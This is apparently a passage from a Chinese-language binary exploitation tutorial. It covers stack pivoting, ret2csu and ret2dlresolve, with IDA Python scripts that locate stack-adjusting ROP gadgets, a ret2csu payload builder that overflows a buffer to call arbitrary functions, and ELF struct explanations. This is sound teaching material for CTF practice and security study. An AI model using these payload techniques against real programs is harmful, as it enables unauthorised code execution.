<h2 id="相对地址栈迁移"><a href="#相对地址栈迁移" class="headerlink" title="相对地址栈迁移"></a>相对地址栈迁移</h2><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"><span class="keyword">from</span> idaapi <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> idautils</span><br><span class="line"> </span><br><span class="line">start_ea = <span class="literal">None</span></span><br><span class="line">end_ea = <span class="literal">None</span></span><br><span class="line">max_len = <span class="number">10</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Gadget</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, addr, asms, val</span>):</span><br><span class="line">        <span class="variable language_">self</span>.addr = addr</span><br><span class="line">        <span class="variable language_">self</span>.asms = asms</span><br><span class="line">        <span class="variable language_">self</span>.val = val</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">for</span> seg <span class="keyword">in</span> idautils.Segments():</span><br><span class="line">        <span class="keyword">if</span> idc.get_segm_name(seg) == <span class="string">&#x27;.text&#x27;</span>:</span><br><span class="line">            start_ea = idc.get_segm_start(seg)</span><br><span class="line">            end_ea = idc.get_segm_end(seg)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">assert</span> start_ea != <span class="literal">None</span></span><br><span class="line">    fp = <span class="built_in">open</span>(<span class="string">&quot;rop.txt&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">    gadgets = []</span><br><span class="line">    i = start_ea</span><br><span class="line">    <span class="keyword">while</span> i &lt; end_ea:</span><br><span class="line">        asm = idc.generate_disasm_line(i, <span class="number">0</span>).split(<span class="string">&quot;;&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> asm.startswith(<span class="string">&quot;add     rsp, &quot;</span>):</span><br><span class="line">            asms = [asm.replace(<span class="string">&quot;     &quot;</span>, <span class="string">&quot; &quot;</span>)]</span><br><span class="line">            val = idc.get_operand_value(i, <span class="number">1</span>)</span><br><span class="line">            j = i + get_item_size(i)</span><br><span class="line">            <span class="keyword">while</span> j &lt; end_ea:</span><br><span class="line">                asm = idc.generate_disasm_line(j, <span class="number">0</span>).split(<span class="string">&quot;;&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">                asms.append(asm.replace(<span class="string">&quot;     &quot;</span>, <span class="string">&quot; &quot;</span>))</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(asms) &gt; max_len: <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;rsp&quot;</span> <span class="keyword">in</span> asm <span class="keyword">or</span> <span class="string">&quot;esp&quot;</span> <span class="keyword">in</span> asm <span class="keyword">or</span> <span class="string">&quot;leave&quot;</span> <span class="keyword">in</span> asm <span class="keyword">or</span> <span class="string">&quot;call&quot;</span> <span class="keyword">in</span> asm: <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">if</span> print_insn_mnem(j) == <span class="string">&quot;push&quot;</span>: val -= <span class="number">8</span></span><br><span class="line">                <span class="keyword">if</span> print_insn_mnem(j) == <span class="string">&quot;pop&quot;</span>: val += <span class="number">8</span></span><br><span class="line">                <span class="keyword">if</span> print_insn_mnem(j) == <span class="string">&quot;retn&quot;</span>:</span><br><span class="line">                    gadgets.append(Gadget(i, asms, val))</span><br><span class="line">                    gadget = Gadget(i, asms, val)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;val: &quot;</span> + <span class="built_in">hex</span>(gadget.val))</span><br><span class="line">                    <span class="built_in">print</span>(<span class="built_in">hex</span>(gadget.addr) + <span class="string">&quot; : &quot;</span> + <span class="string">&quot;; &quot;</span>.join(gadget.asms) + <span class="string">&quot;;&quot;</span>)</span><br><span class="line">                    j += get_item_size(j)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                j += get_item_size(j)</span><br><span class="line">            i = j</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            i += get_item_size(i)</span><br><span class="line">    gadgets = <span class="built_in">sorted</span>(gadgets, key=<span class="keyword">lambda</span> gadget: gadget.val)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;_________________________________________&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">len</span>(gadgets))</span><br><span class="line">    <span class="keyword">for</span> gadget <span class="keyword">in</span> gadgets:</span><br><span class="line">        fp.write(<span class="string">&quot;val: &quot;</span> + <span class="built_in">hex</span>(gadget.val) + <span class="string">&quot;n&quot;</span>)</span><br><span class="line">        fp.write(<span class="built_in">hex</span>(gadget.addr) + <span class="string">&quot; : &quot;</span> + <span class="string">&quot;; &quot;</span>.join(gadget.asms) + <span class="string">&quot;;n&quot;</span>)</span><br><span class="line">    fp.close()</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"><span class="keyword">from</span> idaapi <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> idautils</span><br><span class="line"> </span><br><span class="line">start_ea = <span class="literal">None</span></span><br><span class="line">end_ea = <span class="literal">None</span></span><br><span class="line">max_len = <span class="number">10</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Gadget</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, addr, asms, val</span>):</span><br><span class="line">        <span class="variable language_">self</span>.addr = addr</span><br><span class="line">        <span class="variable language_">self</span>.asms = asms</span><br><span class="line">        <span class="variable language_">self</span>.val = val</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">for</span> seg <span class="keyword">in</span> idautils.Segments():</span><br><span class="line">        <span class="keyword">if</span> idc.get_segm_name(seg) == <span class="string">&#x27;.text&#x27;</span>:</span><br><span class="line">            start_ea = idc.get_segm_start(seg)</span><br><span class="line">            end_ea = idc.get_segm_end(seg)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">assert</span> start_ea != <span class="literal">None</span></span><br><span class="line">    fp = <span class="built_in">open</span>(<span class="string">&quot;rop.txt&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">    gadgets = []</span><br><span class="line">    i = start_ea</span><br><span class="line">    <span class="keyword">while</span> i &lt; end_ea:</span><br><span class="line">        asm = idc.generate_disasm_line(i, <span class="number">0</span>).split(<span class="string">&quot;;&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> asm.startswith(<span class="string">&quot;add     esp, &quot;</span>):</span><br><span class="line">            asms = [asm.replace(<span class="string">&quot;     &quot;</span>, <span class="string">&quot; &quot;</span>)]</span><br><span class="line">            val = idc.get_operand_value(i, <span class="number">1</span>)</span><br><span class="line">            j = i + get_item_size(i)</span><br><span class="line">            <span class="keyword">while</span> j &lt; end_ea:</span><br><span class="line">                asm = idc.generate_disasm_line(j, <span class="number">0</span>).split(<span class="string">&quot;;&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">                asms.append(asm.replace(<span class="string">&quot;     &quot;</span>, <span class="string">&quot; &quot;</span>))</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(asms) &gt; max_len: <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;esp&quot;</span> <span class="keyword">in</span> asm <span class="keyword">or</span> <span class="string">&quot;leave&quot;</span> <span class="keyword">in</span> asm <span class="keyword">or</span> <span class="string">&quot;call&quot;</span> <span class="keyword">in</span> asm: <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">if</span> print_insn_mnem(j) == <span class="string">&quot;push&quot;</span>: val -= <span class="number">4</span></span><br><span class="line">                <span class="keyword">if</span> print_insn_mnem(j) == <span class="string">&quot;pop&quot;</span>: val += <span class="number">4</span></span><br><span class="line">                <span class="keyword">if</span> print_insn_mnem(j) == <span class="string">&quot;retn&quot;</span>:</span><br><span class="line">                    gadgets.append(Gadget(i, asms, val))</span><br><span class="line">                    gadget = Gadget(i, asms, val)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;val: &quot;</span> + <span class="built_in">hex</span>(gadget.val))</span><br><span class="line">                    <span class="built_in">print</span>(<span class="built_in">hex</span>(gadget.addr) + <span class="string">&quot; : &quot;</span> + <span class="string">&quot;; &quot;</span>.join(gadget.asms) + <span class="string">&quot;;&quot;</span>)</span><br><span class="line">                    j += get_item_size(j)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                j += get_item_size(j)</span><br><span class="line">            i = j</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            i += get_item_size(i)</span><br><span class="line">    gadgets = <span class="built_in">sorted</span>(gadgets, key=<span class="keyword">lambda</span> gadget: gadget.val)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;_________________________________________&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">len</span>(gadgets))</span><br><span class="line">    <span class="keyword">for</span> gadget <span class="keyword">in</span> gadgets:</span><br><span class="line">        fp.write(<span class="string">&quot;val: &quot;</span> + <span class="built_in">hex</span>(gadget.val) + <span class="string">&quot;n&quot;</span>)</span><br><span class="line">        fp.write(<span class="built_in">hex</span>(gadget.addr) + <span class="string">&quot; : &quot;</span> + <span class="string">&quot;; &quot;</span>.join(gadget.asms) + <span class="string">&quot;;n&quot;</span>)</span><br><span class="line">    fp.close()</span><br></pre></td></tr></table></figure></div>

<h1 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h1><p>在 64 位程序中，函数的前 6 个参数是通过寄存器传递的，但是大多数时候，我们很难找到每一个寄存器对应的 gadgets。 这时候，我们可以利用 x64 下的 __libc_csu_init 中的 gadgets。这个函数是用来对 libc 进行初始化操作的，而一般的程序都会调用 libc 函数，所以这个函数一定会存在。</p>
<div class="code-container" data-rel="X86asm"><figure class="iseeu highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>00000000004005C0 <span class="comment">; void _libc_csu_init(void)</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004005C0                 <span class="meta">public</span> __libc_csu_init</span><br><span class="line"><span class="symbol">.text:</span>00000000004005C0 __libc_csu_init proc <span class="built_in">near</span>               <span class="comment">; DATA XREF: _start+16o</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004005C0                 <span class="keyword">push</span>    <span class="built_in">r15</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004005C2                 <span class="keyword">push</span>    <span class="built_in">r14</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004005C4                 <span class="keyword">mov</span>     <span class="built_in">r15d</span>, <span class="built_in">edi</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004005C7                 <span class="keyword">push</span>    <span class="built_in">r13</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004005C9                 <span class="keyword">push</span>    <span class="built_in">r12</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004005CB                 <span class="keyword">lea</span>     <span class="built_in">r12</span>, __frame_dummy_init_array_entry</span><br><span class="line"><span class="symbol">.text:</span>00000000004005D2                 <span class="keyword">push</span>    <span class="built_in">rbp</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004005D3                 <span class="keyword">lea</span>     <span class="built_in">rbp</span>, __do_global_dtors_aux_fini_array_entry</span><br><span class="line"><span class="symbol">.text:</span>00000000004005DA                 <span class="keyword">push</span>    <span class="built_in">rbx</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004005<span class="built_in">DB</span>                 <span class="keyword">mov</span>     <span class="built_in">r14</span>, <span class="built_in">rsi</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004005DE                 <span class="keyword">mov</span>     <span class="built_in">r13</span>, <span class="built_in">rdx</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004005E1                 <span class="keyword">sub</span>     <span class="built_in">rbp</span>, <span class="built_in">r12</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004005E4                 <span class="keyword">sub</span>     <span class="built_in">rsp</span>, <span class="number">8</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004005E8                 <span class="keyword">sar</span>     <span class="built_in">rbp</span>, <span class="number">3</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004005EC                 <span class="keyword">call</span>    _init_proc</span><br><span class="line"><span class="symbol">.text:</span>00000000004005F1                 <span class="keyword">test</span>    <span class="built_in">rbp</span>, <span class="built_in">rbp</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004005F4                 <span class="keyword">jz</span>      short loc_400616</span><br><span class="line"><span class="symbol">.text:</span>00000000004005F6                 <span class="keyword">xor</span>     <span class="built_in">ebx</span>, <span class="built_in">ebx</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004005F8                 <span class="keyword">nop</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">rax</span>+<span class="built_in">rax</span>+<span class="number">00000000h</span>]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400600</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400600</span> loc_400600:                             <span class="comment">; CODE XREF: __libc_csu_init+54j</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400600</span>                 <span class="keyword">mov</span>     <span class="built_in">rdx</span>, <span class="built_in">r13</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400603</span>                 <span class="keyword">mov</span>     <span class="built_in">rsi</span>, <span class="built_in">r14</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400606</span>                 <span class="keyword">mov</span>     <span class="built_in">edi</span>, <span class="built_in">r15d</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400609</span>                 <span class="keyword">call</span>    <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="built_in">r12</span>+<span class="built_in">rbx</span>*<span class="number">8</span>]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">000000000040060D</span>                 <span class="keyword">add</span>     <span class="built_in">rbx</span>, <span class="number">1</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400611</span>                 <span class="keyword">cmp</span>     <span class="built_in">rbx</span>, <span class="built_in">rbp</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400614</span>                 <span class="keyword">jnz</span>     short loc_400600</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400616</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400616</span> loc_400616:                             <span class="comment">; CODE XREF: __libc_csu_init+34j</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400616</span>                 <span class="keyword">add</span>     <span class="built_in">rsp</span>, <span class="number">8</span></span><br><span class="line"><span class="symbol">.text:</span>000000000040061A                 <span class="keyword">pop</span>     <span class="built_in">rbx</span></span><br><span class="line"><span class="symbol">.text:</span>000000000040061B                 <span class="keyword">pop</span>     <span class="built_in">rbp</span></span><br><span class="line"><span class="symbol">.text:</span>000000000040061C                 <span class="keyword">pop</span>     <span class="built_in">r12</span></span><br><span class="line"><span class="symbol">.text:</span>000000000040061E                 <span class="keyword">pop</span>     <span class="built_in">r13</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400620</span>                 <span class="keyword">pop</span>     <span class="built_in">r14</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400622</span>                 <span class="keyword">pop</span>     <span class="built_in">r15</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400624</span>                 <span class="keyword">retn</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400624</span> __libc_csu_init endp</span><br></pre></td></tr></table></figure></div>

<p>可以看到，如果能够控制 <code>r12</code> 和 <code>r8</code> 寄存器的值就可以利用 <code>0x0000000000400609</code> 地址处的 <code>call</code> 指令执行任意函数。因此可以利用 <code>0x0000000000400616</code> 到 <code>0000000000400624</code> 的汇编指令先控制寄存器的值，然后再执行 <code>0x0000000000400600</code> 到 <code>0x0000000000400624</code> 的汇编指令调用目标函数，然后返回到主函数再次利用。</p>
<p>对应脚本如下：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">csu_front_addr = <span class="number">0x0000000000400600</span></span><br><span class="line">csu_end_addr = <span class="number">0x000000000040061A</span></span><br><span class="line">fakeebp = <span class="string">&#x27;b&#x27;</span> * <span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">rbx, rbp, r12, r13, r14, r15, last</span>):</span><br><span class="line">    <span class="comment"># pop rbx,rbp,r12,r13,r14,r15</span></span><br><span class="line">    <span class="comment"># rbx should be 0,</span></span><br><span class="line">    <span class="comment"># rbp should be 1,enable not to jump</span></span><br><span class="line">    <span class="comment"># r12 should be the function we want to call</span></span><br><span class="line">    <span class="comment"># rdi=edi=r15d</span></span><br><span class="line">    <span class="comment"># rsi=r14</span></span><br><span class="line">    <span class="comment"># rdx=r13</span></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x80</span> + fakeebp</span><br><span class="line">    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(</span><br><span class="line">        r13) + p64(r14) + p64(r15)</span><br><span class="line">    payload += p64(csu_front_addr)</span><br><span class="line">    payload += <span class="string">&#x27;a&#x27;</span> * <span class="number">0x38</span></span><br><span class="line">    payload += p64(last)</span><br><span class="line">    sh.send(payload)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure></div>

<p>其实，除了上述这个 gadgets，gcc 默认还会编译进去一些其它的函数</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">_init</span><br><span class="line">_start</span><br><span class="line">call_gmon_start</span><br><span class="line">deregister_tm_clones</span><br><span class="line">register_tm_clones</span><br><span class="line">__do_global_dtors_aux</span><br><span class="line">frame_dummy</span><br><span class="line">__libc_csu_init</span><br><span class="line">__libc_csu_fini</span><br><span class="line">_fini</span><br></pre></td></tr></table></figure></div>

<p>我们也可以尝试利用其中的一些代码来进行执行。此外，由于 PC 本身只是将程序的执行地址处的数据传递给 CPU，而 CPU 则只是对传递来的数据进行解码，只要解码成功，就会进行执行。所以我们可以将源程序中一些地址进行偏移从而来获取我们所想要的指令，只要可以确保程序不崩溃。</p>
<h1 id="ret2dlresolve"><a href="#ret2dlresolve" class="headerlink" title="ret2dlresolve"></a>ret2dlresolve</h1><p>需要用 ret2dlresolve 的题目的最大特征是不提供 libc 。另外如果使用 ret2dlresolve 则不能使用 patchelf 修改 elf 文件，因为这样会移动延迟绑定相关的结构。</p>
<h2 id="相关结构"><a href="#相关结构" class="headerlink" title="相关结构"></a>相关结构</h2><p>主要有 <code>.dynamic</code> 、<code>.dynstr</code> 、<code>.dynsym</code> 和 <code>.rel.plt</code> 四个重要的 section 。</p>
<p>结构及关系如下如图（以 32 位为例）：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux%20%E6%A0%88%E6%BA%A2%E5%87%BA/images/d05fcb3f3322bf190a51a7088d9b1ad1.png"
                     
                ></p>
<h3 id="Dyn"><a href="#Dyn" class="headerlink" title="Dyn"></a>Dyn</h3><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Dynamic section entry.  */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Sword	d_tag;			<span class="comment">/* Dynamic entry type */</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      Elf32_Word d_val;			<span class="comment">/* Integer value */</span></span><br><span class="line">      Elf32_Addr d_ptr;			<span class="comment">/* Address value */</span></span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf32_Dyn;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Sxword	d_tag;			<span class="comment">/* Dynamic entry type */</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      Elf64_Xword d_val;		<span class="comment">/* Integer value */</span></span><br><span class="line">      Elf64_Addr d_ptr;			<span class="comment">/* Address value */</span></span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf64_Dyn;</span><br></pre></td></tr></table></figure></div>

<p>Dyn 结构体用于描述动态链接时需要使用到的信息，其成员含义如下：</p>
<ul>
<li><code>d_tag</code> 表示标记值，指明了该结构体的具体类型。比如，<code>DT_NEEDED</code> 表示需要链接的库名，<code>DT_PLTRELSZ</code> 表示 PLT 重定位表的大小等。</li>
<li><code>d_un</code> 是一个联合体，用于存储不同类型的信息。具体含义取决于 <code>d_tag</code> 的值。<ul>
<li>如果 <code>d_tag</code> 的值是一个整数类型，则用 <code>d_val</code> 存储它的值。</li>
<li>如果 <code>d_tag</code> 的值是一个指针类型，则用 <code>d_ptr</code> 存储它的值。</li>
</ul>
</li>
</ul>
<h3 id="Sym"><a href="#Sym" class="headerlink" title="Sym"></a>Sym</h3><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Symbol table entry.  */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word	st_name;		<span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">  Elf32_Addr	st_value;		<span class="comment">/* Symbol value */</span></span><br><span class="line">  Elf32_Word	st_size;		<span class="comment">/* Symbol size */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>	st_info;		<span class="comment">/* Symbol type and binding */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>	st_other;		<span class="comment">/* Symbol visibility */</span></span><br><span class="line">  Elf32_Section	st_shndx;		<span class="comment">/* Section index */</span></span><br><span class="line">&#125; Elf32_Sym;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Word	st_name;		<span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>	st_info;		<span class="comment">/* Symbol type and binding */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> st_other;		<span class="comment">/* Symbol visibility */</span></span><br><span class="line">  Elf64_Section	st_shndx;		<span class="comment">/* Section index */</span></span><br><span class="line">  Elf64_Addr	st_value;		<span class="comment">/* Symbol value */</span></span><br><span class="line">  Elf64_Xword	st_size;		<span class="comment">/* Symbol size */</span></span><br><span class="line">&#125; Elf64_Sym;</span><br></pre></td></tr></table></figure></div>

<p>Sym 结构体用于描述 ELF 文件中的符号（Symbol）信息，其成员含义如下：</p>
<ul>
<li><code>st_name</code>：指向一个存储符号名称的字符串表的索引，即<strong>字符串相对于字符串表起始地址的偏移</strong>。</li>
<li><code>st_info</code>：如果 <strong><code>st_other</code> 为 0</strong> 则设置成 0x12 即可。</li>
<li><code>st_other</code>：决定<strong>函数参数</strong> <code>link_map</code> 参数是否有效。如果该值不为 0 则直接通过 <code>link_map</code> 中的信息计算出目标函数地址。否则需要调用 <code>_dl_lookup_symbol_x</code> 函数查询出新的 <code>link_map</code> 和 <code>sym</code> 来计算目标函数地址。</li>
<li><code>st_value</code>：符号地址相对于模块基址的偏移值。</li>
</ul>
